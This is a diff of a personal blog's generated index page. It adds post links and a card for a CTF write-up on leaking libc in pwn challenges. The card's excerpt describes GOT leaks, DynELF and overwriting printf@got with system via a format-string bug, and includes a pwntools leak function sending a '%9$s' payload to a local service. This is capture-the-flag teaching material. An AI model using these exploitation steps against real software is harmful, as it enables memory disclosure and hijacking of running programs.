@@ -236,6 +236,12 @@
             
               <div class="item">
                 <div class="content">
+                  <a class="item" href="/post/2023-04-26_buaactf2023/">BUAACTF2023 WP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
                   <a class="item" href="/post/2021-12-28_hugo-with-latex/">在hugo中使用latex</a>
                 </div>
               </div>
@@ -356,6 +362,12 @@
             
               <div class="item">
                 <div class="content">
+                  <a class="item" href="/post/2023-04-26_buaactf2023/">BUAACTF2023 WP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
                   <a class="item" href="/post/2021-04-19_likehood-reasoning/">最大似然估计与基本演绎法</a>
                 </div>
               </div>
@@ -447,6 +459,38 @@
   
     <div class="sixteen wide mobile eight wide tablet eight wide computer four wide large screen four wide widescreen column dream-column">
       <article class="ui attached segment card dream-card">
+  <a class="image" href="https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/">
+    
+      <img src="/img/default4.jpg" alt="libc泄漏" />
+    
+  </a>
+
+  <div class="content">
+    <h2 class="ui medium header">
+      <a href="/post/2021-11-10_ctf-libc-leak/">libc泄漏</a>
+    </h2>
+    <div class="meta">
+      <p class="date">Wednesday, Nov 10, 2021</p>
+    </div>
+    <div class="description">
+      libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
+常见泄漏方法  未知libc版本时  常用的泄漏方法有泄漏某个函数的got内容，根据泄漏的地址用LibcSearcher搜索libc。函数的got地址可以用ELF在目标二进制文件中搜到。 在可以泄漏任意地址内容的时候可以用DynELF。
+    格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
+def leak(addr): p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;) p.recvline() payload = &#34;%9$s.AAA&#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&#34;.AAA&#34;)[:-4] + &#34;\x00&#34; log.info(&#34;leaking: 0x%x--&gt; %s&#34; % (addr, data.encode(&#39;hex&#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&#39;system&#39;, &#39;libc&#39;) printf_addr = data.lookup(&#39;printf&#39;, &#39;libc&#39;) log.info(&#34;system address: 0x%x&#34; % system_addr) log.
+    </div>
+  </div>
+
+  <div class="extra content">
+    <div class="author">@&nbsp;Iluvata</div>
+    <div class="reading-time">
+      <i class="clock icon"></i>1 minutes read</div>
+  </div>
+</article>
+
+    </div>
+  
+    <div class="sixteen wide mobile eight wide tablet eight wide computer four wide large screen four wide widescreen column dream-column">
+      <article class="ui attached segment card dream-card">
   <a class="image" href="https://iluvata.github.io/post/2021-09-24_ctf-tools/">
     
       <img src="/img/default1.jpg" alt="CTF基本工具使用指北" />
@@ -486,7 +530,7 @@ context.arch=&#34;amd64&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39
       <article class="ui attached segment card dream-card">
   <a class="image" href="https://iluvata.github.io/post/2021-04-19_likehood-reasoning/">
     
-      <img src="/img/default4.jpg" alt="最大似然估计与基本演绎法" />
+      <img src="/img/default1.jpg" alt="最大似然估计与基本演绎法" />
     
   </a>
 
@@ -517,7 +561,7 @@ context.arch=&#34;amd64&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39
       <article class="ui attached segment card dream-card">
   <a class="image" href="https://iluvata.github.io/post/2021-04-07_iteration-and-recurtion/">
     
-      <img src="/img/default1.jpg" alt="迭代与递归" />
+      <img src="/img/default2.jpg" alt="迭代与递归" />
     
   </a>
 
@@ -587,7 +631,7 @@ context.arch=&#34;amd64&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39
       <article class="ui attached segment card dream-card">
   <a class="image" href="https://iluvata.github.io/post/2021-03-19_distributions/">
     
-      <img src="/img/default3.jpg" alt="概率统计中的分布" />
+      <img src="/img/default4.jpg" alt="概率统计中的分布" />
     
   </a>
 
@@ -621,7 +665,7 @@ context.arch=&#34;amd64&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39
       <article class="ui attached segment card dream-card">
   <a class="image" href="https://iluvata.github.io/post/2021-03-18_recommending-system-basics/">
     
-      <img src="/img/default4.jpg" alt="推荐系统基础" />
+      <img src="/img/default3.jpg" alt="推荐系统基础" />
     
   </a>
 
@@ -652,7 +696,7 @@ context.arch=&#34;amd64&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39
       <article class="ui attached segment card dream-card">
   <a class="image" href="https://iluvata.github.io/post/2021-03-17_operating-system/">
     
-      <img src="/img/default2.jpg" alt="操作系统" />
+      <img src="/img/default1.jpg" alt="操作系统" />
     
   </a>
 
@@ -736,43 +780,6 @@ context.arch=&#34;amd64&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39
 (define (factorial n) (if (&lt; n 2) 1 (* n (factorial (- n 1)))))   最后是构建抽象的能力，能够让我们不被所有实现细节扰乱思路，只把之前构建的函数当作黑盒直接拿来 使用
 (factorial 4)    块结构–以牛顿法求平方根为例  牛顿法是用于求解方程根的算法，从一个猜测开始每次迭代得到一个更好的猜测，不断向根逼近，直到 一个我们指定的要求达到为止。 通过使用抽象和运算符合的能力，我们能够构造improve, good-enough?等方法，最终构造出我们想要的 sqrt算法。
 (define (sqrt-iter guess x) (if (good-enough? guess x) guess (sqrt-iter (better-guess guess x) x))) (define (sqrt x) (sqrt-iter 2.0 x))  在求解的过程中，我们定义的一些方法只有在sqrt中才会被用到，如improve, good-enough?等。为了 防止和其他代码名称冲突，可以把他们全都放到sqrt的定义内，让他们的作用域只限于sqrt.
-    </div>
-  </div>
-
-  <div class="extra content">
-    <div class="author">@&nbsp;Iluvata</div>
-    <div class="reading-time">
-      <i class="clock icon"></i>1 minutes read</div>
-  </div>
-</article>
-
-    </div>
-  
-    <div class="sixteen wide mobile eight wide tablet eight wide computer four wide large screen four wide widescreen column dream-column">
-      <article class="ui attached segment card dream-card">
-  <a class="image" href="https://iluvata.github.io/post/2021-03-11_recommend-system-robustness/">
-    
-      <img src="/img/2021-03-11_fm.jpg" alt="推荐系统的鲁棒性" />
-    
-  </a>
-
-  <div class="content">
-    <h2 class="ui medium header">
-      <a href="/post/2021-03-11_recommend-system-robustness/">推荐系统的鲁棒性</a>
-    </h2>
-    <div class="meta">
-      <p class="date">Thursday, Mar 11, 2021</p>
-    </div>
-    <div class="description">
-       推荐系统概述  推荐系统通过建立用户与产品间的二元关系，利用用户已有的选择过程或相似性关系挖掘每个用户 潜在的感兴趣对象，进而进行个性化推荐的系统。根据其推荐原理的不同，大致可以分为
-  协同过滤推荐算法
-  基于内容的推荐算法
-  基于用户-产品二部图关系的推荐算法
-  混合推荐算法
-  其中协同过滤算法“利用用户已有的选择过程推荐”；基于内容的推荐算法“利用用户或物品间的 相似性关系”；基于用户-产品二部图关系的推荐算法是利用图论的方法进行推荐，类似于PageRank算法。
-  推荐系统评价指标  我们一般在评价推荐系统的时候使用的是准确率和召回率。   正确率 = 提取出的正确信息条数 / 提取出的信息条数   召回率 = 提取出的正确信息条数 / 样本中正确的信息条数   准确率给出提取的信息中正确的比例，召回率给出所有正确信息中被提出的比例。除了常用的两个 指标，用于衡量推荐系统的还有以上两者加权调和平均的F指标，平均绝对误差MAE，平均平方误差MSE（用于 给出评分数值的系统）等。在除了准确率之外，我们有时候希望从一些别的方面对推荐系统做出评价， 包括推荐物品的多样性，新鲜性，用户满意度，可解释性，鲁棒性，公平性等。这里主要讨论推荐系统的 鲁棒性，即在受到破坏（如注入虚假的用户访问记录和用户信息，刷好评，数据缺失）的时候正常工作 的能力。
-  推荐系统鲁棒性   参考链接： 个性化推荐系统研究 个性化推荐系统评价方法综述 通过伪造共同访问对推荐系统进行攻击 全能的FM模型
-  
     </div>
   </div>
 
